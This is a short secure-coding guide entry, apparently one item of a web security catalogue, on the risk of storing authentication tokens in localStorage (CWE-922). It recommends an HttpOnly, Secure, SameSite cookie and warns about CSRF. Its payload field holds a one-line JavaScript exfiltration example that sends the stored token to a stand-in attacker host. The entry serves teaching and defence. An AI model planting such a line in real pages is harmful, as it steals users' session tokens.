---
order: 1
cwe: 922
title: Tokens in localStorage
category: secrets
severity: high
sink: |-
    localStorage.setItem("token", jwt)
payload: |-
    new Image().src = "//evil.sh?t=" + localStorage.token
fix: |
    Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax; Path=/
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage
---

Every script on the origin can read storage, so one XSS or one compromised dependency steals the token. JavaScript cannot read an `HttpOnly` cookie at all: the attacker can only act while the victim's tab is open, not take the session with them. Cookies bring CSRF back, so add its defences.
